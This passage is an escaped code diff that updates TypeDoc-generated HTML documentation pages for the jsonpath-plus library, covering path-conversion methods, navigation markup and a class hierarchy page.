class=\"tsd-signature-symbol\">[]</span></h5></li></ul></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L215\">jsonpath.d.ts:215</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPathArray\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Path<wbr/>Array</span><a href=\"#toPathArray\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPathArray.toPathArray-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Path<wbr/>Array</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span><a href=\"#toPathArray.toPathArray-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a normalized or unnormalized path as string and\n converts to an array: for example,\n <code>['$', 'aProperty', 'anotherProperty']</code>.</p>\n-</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L186\">jsonpath.d.ts:186</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPathString\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Path<wbr/>String</span><a href=\"#toPathString\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPathString.toPathString-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Path<wbr/>String</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><a href=\"#toPathString.toPathString-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a path array and converts to a normalized path string.\n+</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L186\">jsonpath.d.ts:186</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPathString\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Path<wbr/>String</span><a href=\"#toPathString\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPathString.toPathString-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Path<wbr/>String</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><a href=\"#toPathString.toPathString-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a path array and converts to a normalized path string.\n The string will be in a form like:\n <code>$['aProperty']['anotherProperty][0]</code>.\n The JSONPath terminal constructions <code>~</code> and <code>^</code> and type operators\n like <code>@string()</code> are silently stripped.</p>\n-</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">string</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L195\">jsonpath.d.ts:195</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPointer\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Pointer</span><a href=\"#toPointer\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPointer.toPointer-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Pointer</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#toPointer.toPointer-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a path array and converts to a JSON Pointer.</p>\n+</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">string</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L195\">jsonpath.d.ts:195</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPointer\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Pointer</span><a href=\"#toPointer\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPointer.toPointer-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Pointer</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#toPointer.toPointer-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a path array and converts to a JSON Pointer.</p>\n <p>The string will be in a form like: <code>/aProperty/anotherProperty/0</code>\n (with any <code>~</code> and <code>/</code> internal characters escaped as per the JSON\n Pointer spec).</p>\n <p>The JSONPath terminal constructions <code>~</code> and <code>^</code> and type operators\n like <code>@string()</code> are silently stripped.</p>\n-</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L207\">jsonpath.d.ts:207</a></li></ul></aside></li></ul></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Properties\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Properties</summary><div><a href=\"#cache\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>cache</span></a></div></details><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Methods\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Methods</summary><div><a href=\"#evaluate\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>evaluate</span></a><a href=\"#toPathArray\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>Array</span></a><a href=\"#toPathString\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>String</span></a><a href=\"#toPointer\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Pointer</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L207\">jsonpath.d.ts:207</a></li></ul></aside></li></ul></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Properties\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Properties</summary><div><a href=\"#cache\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>cache</span></a></div></details><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Methods\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Methods</summary><div><a href=\"#evaluate\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>evaluate</span></a><a href=\"#toPathArray\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>Array</span></a><a href=\"#toPathString\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>String</span></a><a href=\"#toPointer\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Pointer</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: docs/ts/hierarchy.html:\n```\n@@ -1 +1 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"assets/style.css\"/><link rel=\"stylesheet\" href=\"assets/highlight.css\"/><script defer src=\"assets/main.js\"></script><script async src=\"assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\".\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><h2>jsonpath-plus</h2></div><h2>Class Hierarchy</h2><ul class=\"tsd-full-hierarchy\"><li><a id=\"JSONPathOptions\" class=\"tsd-anchor\"></a><a href=\"interfaces/JSONPathOptions.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-256\"></use></svg>JSONPathOptions</a><ul><li><a id=\"JSONPathOptionsAutoStart\" class=\"tsd-anchor\"></a><a href=\"interfaces/JSONPathOptionsAutoStart.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-256\"></use></svg>JSONPathOptionsAutoStart</a><ul></ul></li></ul></li></ul></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"modules.html\" class=\"current\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\".\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"assets/style.css\"/><link rel=\"stylesheet\" href=\"assets/highlight.css\"/><script defer src=\"assets/main.js\"></script><script async src=\"assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\".\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><h1>jsonpath-plus</h1></div><h2>Class Hierarchy</h2><ul class=\"tsd-full-hierarchy\"><li><a id=\"JSONPathOptions\" class=\"tsd-anchor\"></a><a href=\"interfaces/JSONPathOptions.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-256\"></use></svg>JSONPathOptions</a><ul><li><a id=\"JSONPathOptionsAutoStart\" class=\"tsd-anchor\"></a><a href=\"interfaces/JSONPathOptionsAutoStart.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-256\"></use></svg>JSONPathOptionsAutoStart</a><ul></ul></li></ul></li></ul></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"modules.html\" class=\"current\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\".\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: docs/ts/index.html:\n```\n@@ -1,4 +1,4 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"assets/style.css\"/><link rel=\"stylesheet\" href=\"assets/highlight.css\"/><script defer src=\"assets/main.js\"></script><script async src=\"assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || 